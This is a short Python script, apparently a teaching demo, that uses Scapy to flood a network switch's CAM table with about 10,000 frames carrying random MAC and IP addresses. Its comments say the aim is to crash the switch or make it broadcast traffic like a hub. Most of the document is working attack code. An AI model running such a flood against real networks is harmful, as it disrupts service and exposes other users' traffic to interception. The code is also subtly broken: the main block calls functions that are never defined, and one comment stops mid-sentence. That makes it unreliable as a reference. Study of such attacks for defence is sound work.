#CAM Table Overflow
#Keith Edmunds
#
#Demo a CAM overflow attack against a switch using Scapy library. A CAM Overflow is designed to fill all available entries in a switches "Content-Addressable Memory" table.
#A switch inspects every frame that goes through it and records the source and destination MAC for faster future frame forwarding. A switch can only store so many of these records.
#The CAM Overflow attacks this table by sending thousands upon thousands of frames with random source and destination MAC addresses. Given a CAM table can only store 5,000 to 6,000 records
#the table is quickly filled with random, junk data. This will cause the switch to crash or start broadcasting data like a hub as it cannot find the correct interfaces to use.
#
#1 - Import Scapy.
#2 - Create a function to build and return 10,000 frames with a random destination MAC and random source MAC. A CAM overflow has to happen very quickly to work so it is best if we create the frames first.
#3 - Use our packet list and sendp to transmit our packets over the wire. This will send 10,000 frames with 
#4 - Make sure you change the interface to the correct one.

from scapy.all import *

#Create all of our frames first so we can send them quickly. Our frame will layer a packet with random IPs with a frame with random MAC addresses.
def generateFrames():
    frames = []
    for i in xrange(1,10000):
        frame  = Ether(src = RandMAC(),dst= RandMAC())/IP(src=RandIP(),dst=RandIP())
        frames.append(frame)
    return frames

#Send out our frames.
def overflowCAM(frames):
    sendp(frames, iface='tap0') #Send the frames, change tap0

if __name__ == '__main__':
    cam_overflow(generate_packets())
